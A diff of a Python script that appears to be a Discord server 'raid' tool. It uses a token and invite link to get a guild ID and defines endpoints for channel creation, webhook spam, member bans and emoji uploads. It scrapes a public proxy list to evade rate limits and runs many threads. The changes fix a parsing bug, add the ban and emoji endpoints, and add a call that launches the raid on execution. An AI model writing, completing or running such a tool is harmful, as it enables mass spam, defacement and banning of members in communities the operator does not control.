@@ -1,4 +1,3 @@
-
 import requests
 import threading
 import sys
@@ -26,7 +25,7 @@ try:
     r = requests.get(f"https://discord.com/api/v9/invites/{invite_link}",headers = getheaders(token))
     if r.status_code == 200:
         pass
-        guild_id = r["guild"]["id"]
+        guild_id = r.json()["guild"]["id"]
     else:
         print('please enter a valid token')
         print(f'error : {r.json()}')
@@ -44,7 +43,9 @@ util = {"guild_id" : guild_id,
 url =  {"channel" : "https://discord.com/api/v9/guilds/{guild_id}/channels",
         "webhook" : "https://discord.com/api/v9/channels/{channel_id}/webhooks",
         "message" : "https://discord.com/api/webhooks/{webhook_id}/{webhook_token}",
-        "proxy" : "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
+        "proxy" : "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+        "kick_url" : "https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}",
+        "add_emoji" : "https://discord.com/api/v9/guilds/{guild_id}/emojis"
 }
 
 def proxy_scrape(url):
@@ -98,4 +99,4 @@ def raid(util, url):
         threads.append(t)
         t.start()
 
-
+raid(util,url)
